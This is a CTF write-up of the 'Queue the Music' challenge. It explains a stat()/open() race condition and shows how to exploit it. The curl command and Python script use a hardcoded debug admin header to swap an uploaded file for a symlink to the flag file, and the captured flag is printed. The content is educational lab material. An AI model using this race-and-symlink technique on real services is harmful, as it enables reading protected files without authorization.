# Queue the Music - CTF Writeup

**Challenge:** Queue the Music
**Platform:** UWSP Pointer Overflow CTF
**Category:** Exploit
**Difficulty:** Medium
**Flag:** `poctf{uwsp_qu3u3_17_b3f0r3_1_d0}`

## Challenge Description

A web service that allows users to upload audio tracks and queue them into a public playlist. The challenge hinted at race conditions with the phrase "how racy these things can get."

**Target:** Read `/flag/flag.txt`
**Base URL:** https://exp200-1.pointeroverflowctf.com

## Reconnaissance

### Available Endpoints
- `POST /session` - Get a session ID
- `POST /upload` - Upload content (writes to `/tmp/uploads/<sid>/track.txt`)
- `POST /queue` - Queue the uploaded file to the playlist
- `GET /playlist` - View the public playlist
- `GET /robots.txt` - Revealed `/debug/` endpoint and `X-Admin` header
- `GET /public/release.html` - Documented the debug toggle endpoint

### Source Code Analysis

The queuer program ([exp200-1.c](exp200-1.c)) showed a classic TOCTOU (Time-of-Check Time-of-Use) vulnerability:

```c
// Pre-check
struct stat st;
if (stat(path, &st) == -1) { perror("stat"); return 2; }
if (!S_ISREG(st.st_mode) || st.st_size > 4096) {  // Must be regular file
    fputs("bad path\n", stderr);
    return 2;
}

// Use the path - RACE WINDOW HERE
int in = open(path, O_RDONLY);  // Follows symlinks!
```

**Vulnerability:** Between `stat()` and `open()`, the file can be replaced. If replaced with a symlink, `open()` will follow it.

### Debug Endpoint Discovery

From `/public/release.html`:
```
curl -s -H "X-Admin: devtoken" -d "sid=DEMO&mode=symlink" https://YOUR_HOST/debug/toggle
```

The `/debug/toggle` endpoint with `mode=symlink` changes upload behavior to create symlinks instead of regular files.

## Exploitation Strategy

The key insight was understanding the race condition requirements:

1. **At `stat()` time:** File must be a REGULAR file (to pass `S_ISREG` check)
2. **At `open()` time:** File should be a SYMLINK pointing to `/flag/flag.txt`

### Attack Flow

1. Create a session
2. Upload a regular file (100 bytes of 'x') - this passes the stat() check
3. Start queuing in one thread (triggers stat/open sequence)
4. Immediately in parallel:
   - Enable symlink mode via `/debug/toggle`
   - Upload `/flag/flag.txt` - creates a symlink
5. If timing is right, the file becomes a symlink after `stat()` but before `open()`
6. The `open()` call follows the symlink and reads `/flag/flag.txt`

### Final Exploit

```python
def attempt_race(delay):
    # Create session and get SID
    resp = requests.post(f"{BASE_URL}/session", verify=False)
    sid = resp.json()["sid"]

    # Upload regular file to pass stat() check
    requests.post(f"{BASE_URL}/upload",
                  data={"sid": sid, "content": "x" * 100},
                  verify=False)

    # Start queuing (triggers stat/open)
    threading.Thread(target=queue_file, args=(sid,)).start()

    # After tiny delay, replace with symlink
    time.sleep(delay)
    requests.post(f"{BASE_URL}/debug/toggle",
                  headers={"X-Admin": "devtoken"},
                  data={"sid": sid, "mode": "symlink"},
                  verify=False)

    requests.post(f"{BASE_URL}/upload",
                  data={"sid": sid, "content": "/flag/flag.txt"},
                  verify=False)
```

## Result

The exploit succeeded on the first attempt with a 0.0001s delay, successfully reading the flag from `/flag/flag.txt` into the playlist.

**Flag:** `poctf{uwsp_qu3u3_17_b3f0r3_1_d0}`

## Key Takeaways

1. TOCTOU vulnerabilities require understanding the exact state needed at each check/use point
2. The `stat()` check required a regular file, but symlinks are followed by `open()`
3. The debug endpoint's symlink mode was crucial for creating actual symlinks
4. Threading and precise timing were necessary to win the race condition
5. The flag name "queue it before I do" is a clever hint at the race condition nature

## Files
- [exp200-1.c](exp200-1.c) - Vulnerable queuer program source
- [final_exploit.py](final_exploit.py) - Working exploit that captured the flag
